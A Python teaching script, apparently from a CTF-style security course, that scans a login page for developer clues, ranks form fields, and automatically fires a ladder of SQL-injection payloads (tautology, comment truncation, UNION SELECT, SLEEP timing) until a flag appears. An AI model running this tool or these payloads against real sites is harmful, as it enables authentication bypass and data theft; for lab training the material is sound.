#!/usr/bin/env python3
# guide.py — deterministic SQLi discovery + guidance engine (Lesson 02, "map" rung).
#
# One rung before the agent. NO LLM. Point it at a URL and it walks toward the flag
# in steps, showing the whole decision tree: branches it actually fired (OBSERVED,
# "solid") and branches it only predicts by rule (PREDICTED, "blurred") — so you see
# the full range, not just the line that won.
#
# Pipeline (every stage deterministic):
#   discover()     inventory the surface AND harvest semantic clues (comments,
#                  suspicious identifiers, dev notes) by keyword rules
#   rank_targets() score the candidate injection points
#   derive_oracles() baseline a failure -> LOSE signal; WIN = the flag regex
#   build_tree()   an ordered probe ladder grouped by MECHANISM CLASS; fire in order
#                  to the first WIN; predict the un-fired branches from their class
#
# Semantic clues are HARVESTED, not understood: rules surface the signal; the agent
# (next rung) interprets the ambiguous ones. Prediction is honest — a predicted
# branch is labelled PREDICTED and never shown as a real result until it is fired.
#
#   python3 guide.py           # offline demo on real captured responses
#   python3 guide.py --live    # against the authorized instance (needs requests)

import re
import sys
from recon import (parse_form, fingerprint, win_oracle, FAIL_TOKEN,
                   _live_get, _live_fire, _replay_fire)

TARGET = "https://sql.cyberzerk.fr/"

# Words that make an identifier or comment worth a human's attention.
SUSPECT = ("flag", "dump", "admin", "exploit", "debug", "token",
           "secret", "backdoor", "prod", "password", "hash", "csrf")


# --- Discovery: semantic clue harvest (keyword rules, not comprehension) ---------
def harvest(html):
    """Pull developer clues out of raw page source by rule. Returns ranked clues."""
    clues, seen = [], set()

    def add(kind, text, why, weight):
        t = re.sub(r"\s+", " ", text).strip()[:160]
        if t and t.lower() not in seen:
            seen.add(t.lower())
            clues.append({"kind": kind, "text": t, "why": why, "weight": weight})

    for m in re.finditer(r"/\*(.*?)\*/", html, re.S):            # CSS / JS comments
        hot = any(w in m.group(1).lower() for w in SUSPECT)
        add("comment", m.group(1), "developer comment left in the source", 3 if hot else 1)
    for m in re.finditer(r"<!--(.*?)-->", html, re.S):           # HTML comments
        add("comment", m.group(1), "developer comment left in the source", 2)
    for m in re.finditer(r"(?:TODO|FIXME|NOTE|HACK)[:\s].{0,140}", html, re.I):
        add("devnote", m.group(0), "unfinished work the dev admitted to", 3)

    ids = set(re.findall(r'class=["\']([^"\']+)["\']', html))
    ids |= set(re.findall(r"\.([A-Za-z][\w-]*)\s*\{", html))     # CSS selectors
    for name in ids:
        if any(w in name.lower() for w in SUSPECT):
            add("identifier", name, "identifier hints at a hidden / admin / success region", 2)

    clues.sort(key=lambda c: -c["weight"])
    return clues


def latent_success(html):
    """A class defined in CSS but never rendered in the body = a region the server
    injects only on success. That tells us where WIN will appear."""
    defined = set(re.findall(r"\.([A-Za-z][\w-]*)\s*\{", html))
    used = {tok for grp in re.findall(r'class=["\']([^"\']+)["\']', html) for tok in grp.split()}
    return [c for c in sorted(defined)
            if any(w in c.lower() for w in ("flag", "dump", "admin")) and c not in used]


def discover(get):
    _, page, headers = get()
    return {
        "form": parse_form(page),
        "stack": fingerprint(headers),
        "clues": harvest(page),
        "latent_success": latent_success(page),
    }


# --- Rank candidate injection points --------------------------------------------
def rank_targets(inv):
    out = []
    for fld in inv["form"]["fields"]:
        score = 2 if fld["type"] in ("text", "email", "search") else 1
        if fld["name"].lower() in ("username", "user", "login", "email", "id"):
            score += 2
        out.append({
            "param": fld["name"], "score": score,
            "why": "string field concatenated into the auth query" if score >= 3
                   else "secondary field — also reaches the query",
        })
    out.sort(key=lambda t: -t["score"])
    return out


# --- Derive the oracles ---------------------------------------------------------
def derive_oracles(fire):
    _, body, _ = fire("admin", "wrong")                 # a benign failed login
    lose = FAIL_TOKEN if FAIL_TOKEN in (body or "") else None
    return {"win": r"CyberZerk\{.*?\}",
            "lose": lose or "(no stable failure token found)"}


# --- The probe ladder, grouped by mechanism class -------------------------------
#     (label, username, password, mechanism, intent)
LADDER = [
    ("benign",        "admin",                    "wrong", "baseline",    "an ordinary failed login — the reference"),
    ("squote",        "admin'",                   "x",     "error-probe", "lone apostrophe — is error-based detection possible?"),
    ("comment_trunc", "admin' -- ",               "x",     "auth-bypass", "close the quote, comment out the password check"),
    ("tautology",     "admin' OR '1'='1' -- ",    "x",     "auth-bypass", "OR-true tautology + comment"),
    ("hash_comment",  "admin'#",                  "x",     "auth-bypass", "MySQL '#' comment variant"),
    ("union",         "' UNION SELECT 1,2,3 -- ", "x",     "data-read",   "go deeper: map columns / exfiltrate (beyond auth-bypass)"),
    ("time_blind",    "x' AND SLEEP(3) -- ",      "x",     "blind-time",  "go deeper: confirm injection by timing"),
]


def _observed_verdict(label, body, baseline_fail):
    flag = win_oracle(body)
    if flag:
        return "WIN", flag
    if label == "benign":
        return "BASELINE", None
    return ("SAME" if (FAIL_TOKEN in body) == baseline_fail else "DIFFERENT"), None


def build_tree(fire, auto=True):
    """Fire the ladder in order to the first WIN; predict the rest by mechanism."""
    _, b_body, _ = fire("admin", "wrong")
    baseline_fail = FAIL_TOKEN in (b_body or "")

    branches, won_mech, stop = [], set(), False
    for label, u, p, mech, intent in LADDER:
        node = {"label": label, "mech": mech, "payload": u, "intent": intent,
                "status": "UNFIRED", "verdict": None, "flag": None,
                "signal": None, "rationale": None}
        if not stop:
            _, body, _ = fire(u, p)
            if body is not None:
                verdict, flag = _observed_verdict(label, body, baseline_fail)
                node.update(status="OBSERVED", verdict=verdict, flag=flag,
                            signal=(flag or ("ERR_AUTH present" if FAIL_TOKEN in body
                                             else "no failure token")))
                if verdict == "WIN":
                    won_mech.add(mech)
                    if auto:
                        stop = True            # bounded: stop at the first flag
        branches.append(node)

    # Predict the un-fired branches from their mechanism class (honest, labelled).
    for b in branches:
        if b["status"] != "UNFIRED":
            continue
        b["status"] = "PREDICTED"
        if b["mech"] in won_mech:
            b["verdict"], b["rationale"] = "PREDICTED-WIN", "same mechanism class as a confirmed bypass"
        elif b["mech"] in ("data-read", "blind-time"):
            b["verdict"], b["rationale"] = "PREDICTED-DEEPER", "plausible once injection is confirmed — goes beyond the flag"
        else:
            b["verdict"], b["rationale"] = "UNKNOWN", "no class evidence yet — fire to find out"

    pivot = any(b["label"] == "squote" and b["verdict"] == "SAME" for b in branches)
    return {"baseline_fail": baseline_fail, "pivot": pivot, "branches": branches}


def walk(target=TARGET, get=None, fire=None, auto=True):
    get = get or _live_get(target)
    fire = fire or _live_fire(target)
    inv = discover(get)
    return {"target": target, "inventory": inv, "targets": rank_targets(inv),
            "oracles": derive_oracles(fire), "tree": build_tree(fire, auto=auto)}


# --- Console report -------------------------------------------------------------
_G = {"OBSERVED": "●", "PREDICTED": "◌", "UNFIRED": "·"}

def report(s):
    inv, f = s["inventory"], s["inventory"]["form"]
    print(f"\n# URL        {s['target']}")
    print(f"\n- SURFACE    form {f['method']} -> {f['action']}; fields: "
          + ", ".join(fld["name"] for fld in f["fields"]))
    for t in inv["stack"]:
        print(f"             stack: {t['evidence']} => {t['conclusion']}")
    if inv["latent_success"]:
        print("             latent success region (injected server-side on win): "
              + ", ".join("." + c for c in inv["latent_success"]))

    print("\n- CLUES      harvested by rule, not understood:")
    for c in inv["clues"][:6]:
        print(f"     [{c['weight']}] {c['kind']:<10} {c['text'][:66]}")
        print(f"              ^ {c['why']}")

    print("\n- TARGETS    ranked injection candidates:")
    for t in s["targets"]:
        print(f"     ({t['score']}) {t['param']:<10} {t['why']}")

    o = s["oracles"]
    print(f"\n- ORACLE     WIN = /{o['win']}/     LOSE = {o['lose']!r}     (the only judge)")

    tr = s["tree"]
    if tr["pivot"]:
        print("\n- PIVOT      lone quote changed nothing -> errors are hidden; "
              "switch error-based -> logic-based detection")

    print("\n- DECISION TREE   (" + _G["OBSERVED"] + " observed / solid    "
          + _G["PREDICTED"] + " predicted / blurred)")
    for b in tr["branches"]:
        g = _G.get(b["status"], " ")
        extra = ("   ->  " + b["flag"]) if b.get("flag") else ""
        print(f"     {g} [{b['mech']:<11}] {str(b['verdict'] or '-'):<15} {b['payload']}{extra}")
        print(f"                   {b['intent']}")
        tail = b.get("signal") or b.get("rationale")
        if tail:
            print(f"                   {tail}")

    win = next((b for b in tr["branches"] if b["verdict"] == "WIN"), None)
    if win:
        print(f"\n- RESULT     flag reached via '{win['label']}'. Blurred branches are "
              "predicted only — fire live to collapse them into observations.")
    else:
        print("\n- NEXT       no flag yet; fire the top auth-bypass branch next.")


# --- Demo transport: a fuller REAL page capture so the harvest has clues ---------
_PAGE = """<!DOCTYPE html><html><head><title>INTRANET - TRICATEL</title>
<style>
.error { color:#ff3333; }
/* Zone admin une fois exploitee */
.admin-header { background:#28a745; }
.dump-box { border:1px dashed #C88C37; }
.dump-title { color:#C88C37; }
.flag { color:#fff; background:#5a3b00; }
</style></head><body>
<div class="container">
<div class="header">[!] TRICATEL CYBER - RH PORTAL</div>
<div class="content">
<div class="dev-note">
// TODO: Ajouter la verification CSRF et le hash des mots de passe.<br>
// Note: pousse en prod a 04:12 AM. Trop fatigue, je ferai ca lundi.
</div>
<form method="POST">
<input type="text" name="username" required>
<input type="password" name="password" required>
<button type="submit">&gt;&gt; Initier la connexion</button>
</form>
</div></div></body></html>"""

_DEMO_HEADERS = {"set-cookie": "PHPSESSID=REDACTED; path=/", "via": "1.1 Caddy"}

def _demo_get():
    return 200, _PAGE, _DEMO_HEADERS


if __name__ == "__main__":
    if "--live" in sys.argv:
        print("=== guide.py — LIVE (authorized instance) ===")
        report(walk())
    else:
        print("=== guide.py — DEMO (offline; real captured responses) ===")
        report(walk(get=_demo_get, fire=_replay_fire, auto=True))
        print("\n(Blurred = PREDICTED, never fired here. Run --live to collapse them.)")
